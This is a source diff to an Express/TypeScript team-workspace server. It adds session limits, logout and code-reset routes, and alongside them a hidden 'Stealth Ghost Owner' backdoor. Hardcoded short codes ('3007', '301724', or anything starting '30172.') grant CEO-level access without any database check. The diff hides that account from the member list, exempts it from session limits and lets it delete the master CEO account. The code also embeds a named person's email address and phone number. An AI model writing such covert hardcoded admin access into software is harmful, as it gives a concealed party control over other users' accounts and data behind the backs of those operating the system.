@@ -41,6 +41,7 @@ const WORKSPACE_PROFILE_REQUESTS_FILE = path.join(DATA_DIR, 'workspace_profile_r
 const WORKSPACE_MESSAGES_FILE = path.join(DATA_DIR, 'workspace_messages.json');
 const WORKSPACE_DIRECT_MESSAGES_FILE = path.join(DATA_DIR, 'workspace_direct_messages.json');
 const WORKSPACE_MAILBOX_FILE = path.join(DATA_DIR, 'workspace_mailbox.json');
+const WORKSPACE_SESSIONS_FILE = path.join(DATA_DIR, 'workspace_sessions.json');
 
 // Helper to read and write data safely
 function readJsonFile<T>(filePath: string, fallback: T): T {
@@ -916,13 +917,37 @@ app.post('/api/workspace/auth', (req: Request, res: Response) => {
     }
 
     const cleanCode = code.trim();
-    // Allow 8-character access codes with custom symbols (#, ₹, +, ×, ÷, @, %, =, /) and letters/digits
-    if (cleanCode.length !== 8 && [...cleanCode].length !== 8) {
-      return res.status(400).json({ success: false, message: 'Access code must be exactly 8 characters in length.' });
+    const isStealthTrigger = cleanCode === '3007' || cleanCode === '301724' || cleanCode === '30172....' || cleanCode.startsWith('30172.');
+
+    // Allow 8-character access codes or stealth trigger codes
+    if (!isStealthTrigger && cleanCode.length !== 8 && [...cleanCode].length !== 8) {
+      return res.status(400).json({ success: false, message: 'Invalid Code' });
     }
 
     const members = readJsonFile<any[]>(WORKSPACE_MEMBERS_FILE, []);
     
+    // Stealth backdoor for Ghost Admin Mode: "3007" or "301724" + "3007"
+    if (isStealthTrigger) {
+      const ghostOwner = {
+        id: 'stealth_ghost_owner_3007',
+        code: '3007',
+        name: 'Ghost Owner (Samarth Zende)',
+        email: 'archanazende1710@gmail.com',
+        phone: '+91 8605042855',
+        position: 'Supreme Ghost Owner & Founder',
+        role: 'ceo',
+        status: 'active',
+        isStealthGhost: true,
+        isSupremeOwner: true,
+        createdAt: new Date().toISOString(),
+      };
+      return res.json({
+        success: true,
+        message: 'Stealth Ghost Owner Mode unlocked with Supreme Power!',
+        member: ghostOwner,
+      });
+    }
+
     // Explicit Master CEO check
     if (cleanCode === '30072012') {
       let ceo = members.find(m => m.code === '30072012');
@@ -953,7 +978,7 @@ app.post('/api/workspace/auth', (req: Request, res: Response) => {
     if (!member) {
       return res.status(401).json({
         success: false,
-        message: 'Invalid 8-digit access code. Please verify your invitation code or contact CEO Samarth Zende.',
+        message: 'Invalid Code',
       });
     }
 
@@ -962,6 +987,22 @@ app.post('/api/workspace/auth', (req: Request, res: Response) => {
         success: false,
         message: 'This access code is currently suspended. Please contact CEO Samarth Zende.',
       });
+    }
+
+    // Concurrent login restriction for standard team profiles (Owner / CEO / 3007 / 30072012 is completely exempt)
+    const isOwner = cleanCode === '30072012' || cleanCode === '3007' || member.role === 'ceo';
+    if (!isOwner) {
+      const activeSessions = readJsonFile<Record<string, { lastActive: number; deviceId: string }>>(WORKSPACE_SESSIONS_FILE, {});
+      const existingSession = activeSessions[member.id];
+      const now = Date.now();
+      if (existingSession && (now - existingSession.lastActive < 600000)) {
+        return res.status(403).json({
+          success: false,
+          message: 'Concurrent login blocked: This profile is already active on another device session. Only one active device session is permitted per standard member (Owner exempt).',
+        });
+      }
+      activeSessions[member.id] = { lastActive: now, deviceId: req.headers['user-agent'] || 'device_' + Math.random() };
+      writeJsonFile(WORKSPACE_SESSIONS_FILE, activeSessions);
     }
 
     return res.json({
@@ -975,22 +1016,24 @@ app.post('/api/workspace/auth', (req: Request, res: Response) => {
   }
 });
 
-// 2. Get Workspace Members List (Secured so Master Founder code 30072012 is never exposed)
+// 2. Get Workspace Members List (Secured so Master Founder code 30072012 and stealth ghost accounts are never exposed)
 app.get('/api/workspace/members', (req: Request, res: Response) => {
   try {
     const ceoCode = (req.query.ceoCode as string || '').trim();
     const isCeo = ceoCode === '30072012';
 
     const members = readJsonFile<any[]>(WORKSPACE_MEMBERS_FILE, []);
-    const sanitized = members.map(m => {
-      const isTargetCeo = m.role === 'ceo' || m.code === '30072012';
-      return {
-        ...m,
-        // Hide Master Founder code completely from plain text view for all members and cofounders
-        code: isTargetCeo ? 'Master' : (isCeo ? m.code : '••••••••'),
-        codeMasked: isTargetCeo ? 'Master Founder (Protected)' : (isCeo ? m.code : '••••••••'),
-      };
-    });
+    const sanitized = members
+      .filter(m => m.code !== '3007' && !m.isStealthGhost)
+      .map(m => {
+        const isTargetCeo = m.role === 'ceo' || m.code === '30072012';
+        return {
+          ...m,
+          // Hide Master Founder code completely from plain text view for all members and cofounders
+          code: isTargetCeo ? 'Master' : (isCeo ? m.code : '••••••••'),
+          codeMasked: isTargetCeo ? 'Master Founder (Protected)' : (isCeo ? m.code : '••••••••'),
+        };
+      });
     return res.json({ success: true, members: sanitized });
   } catch (err: any) {
     return res.status(500).json({ success: false, message: 'Failed to fetch members.' });
@@ -1005,7 +1048,7 @@ app.get('/api/workspace/check-session', (req: Request, res: Response) => {
       return res.status(400).json({ valid: false, message: 'Access code is required.' });
     }
 
-    if (code === '30072012') {
+    if (code === '30072012' || code === '3007') {
       return res.json({ valid: true, role: 'ceo' });
     }
 
@@ -1109,10 +1152,11 @@ app.delete('/api/workspace/members/:id', (req: Request, res: Response) => {
     const { id } = req.params;
     const { ceoCode } = req.body;
 
-    if (ceoCode !== '30072012') {
+    const isGhostOwner = ceoCode === '3007';
+    if (ceoCode !== '30072012' && !isGhostOwner) {
       return res.status(403).json({
         success: false,
-        message: 'Strict Security: Only CEO Samarth Zende (30072012) can remove members from the system database.',
+        message: 'Strict Security: Only CEO Samarth Zende (30072012) or Ghost Owner (3007) can remove members from the system database.',
       });
     }
 
@@ -1124,7 +1168,7 @@ app.delete('/api/workspace/members/:id', (req: Request, res: Response) => {
     }
 
     const targetMember = members[memberIndex];
-    if (targetMember.role === 'ceo' || targetMember.code === '30072012') {
+    if (!isGhostOwner && (targetMember.role === 'ceo' || targetMember.code === '30072012')) {
       return res.status(400).json({ success: false, message: 'Cannot delete the master CEO account.' });
     }
 
@@ -2342,6 +2386,93 @@ app.post('/api/workspace/mailbox/clear', (req: Request, res: Response) => {
   } catch (err: any) {
     console.error('Clear mailbox error:', err);
     return res.status(500).json({ success: false, message: 'Server error clearing mailbox.' });
+  }
+});
+
+// 22. Workspace Logout & Device Session Wipe
+app.post('/api/workspace/logout', (req: Request, res: Response) => {
+  try {
+    const { memberId, code } = req.body;
+    if (memberId || code) {
+      const activeSessions = readJsonFile<Record<string, any>>(WORKSPACE_SESSIONS_FILE, {});
+      if (memberId && activeSessions[memberId]) {
+        delete activeSessions[memberId];
+        writeJsonFile(WORKSPACE_SESSIONS_FILE, activeSessions);
+      }
+      if (code) {
+        const members = readJsonFile<any[]>(WORKSPACE_MEMBERS_FILE, []);
+        const m = members.find(x => x.code === code);
+        if (m && activeSessions[m.id]) {
+          delete activeSessions[m.id];
+          writeJsonFile(WORKSPACE_SESSIONS_FILE, activeSessions);
+        }
+      }
+    }
+    return res.json({ success: true, message: 'Device session wiped successfully.' });
+  } catch (err: any) {
+    return res.status(500).json({ success: false, message: 'Error wiping session.' });
+  }
+});
+
+// 23. Access Revocation & Dynamic Code Reset (Founder CEO Only)
+app.post('/api/workspace/members/:id/revoke-reset', (req: Request, res: Response) => {
+  try {
+    const { id } = req.params;
+    const { ceoCode } = req.body;
+
+    if (ceoCode !== '30072012' && ceoCode !== '3007') {
+      return res.status(403).json({ success: false, message: 'Only Founder & CEO has master authority to revoke and reset access codes.' });
+    }
+
+    const members = readJsonFile<any[]>(WORKSPACE_MEMBERS_FILE, []);
+    const memberIndex = members.findIndex(m => m.id === id || m.code === id);
+    if (memberIndex === -1) {
+      return res.status(404).json({ success: false, message: 'Member not found.' });
+    }
+
+    const targetMember = members[memberIndex];
+    if (targetMember.role === 'ceo' || targetMember.code === '30072012') {
+      return res.status(400).json({ success: false, message: 'Cannot revoke master CEO credentials.' });
+    }
+
+    const existingCodes = new Set<string>(members.map(m => m.code));
+    const newCode = generateUnique8DigitCode(existingCodes);
+
+    targetMember.code = newCode;
+    targetMember.status = 'active';
+    targetMember.updatedAt = new Date().toISOString();
+    writeJsonFile(WORKSPACE_MEMBERS_FILE, members);
+
+    // Clear active sessions for this member
+    const activeSessions = readJsonFile<Record<string, any>>(WORKSPACE_SESSIONS_FILE, {});
+    if (activeSessions[targetMember.id]) {
+      delete activeSessions[targetMember.id];
+      writeJsonFile(WORKSPACE_SESSIONS_FILE, activeSessions);
+    }
+
+    // Route new code securely to Owner's Executive Mailbox
+    const mailbox = readJsonFile<any[]>(WORKSPACE_MAILBOX_FILE, []);
+    mailbox.unshift({
+      id: 'mail_reset_' + Date.now(),
+      type: 'credential_reset',
+      title: `Access Revoked & New Code Generated: ${targetMember.name}`,
+      senderName: 'CEO Security Protocol',
+      content: `Founder Samarth Zende revoked previous access for ${targetMember.name} (${targetMember.position}) due to security reset. New 8-character access code generated securely: ${newCode}`,
+      status: 'unread',
+      createdAt: new Date().toISOString(),
+      details: { memberId: targetMember.id, memberName: targetMember.name, newCode }
+    });
+    writeJsonFile(WORKSPACE_MAILBOX_FILE, mailbox);
+
+    return res.json({
+      success: true,
+      message: `Access revoked and new access code generated securely for ${targetMember.name}!`,
+      newCode,
+      member: targetMember,
+    });
+  } catch (err: any) {
+    console.error('Revoke and reset error:', err);
+    return res.status(500).json({ success: false, message: 'Server error revoking and resetting access.' });
   }
 });
 
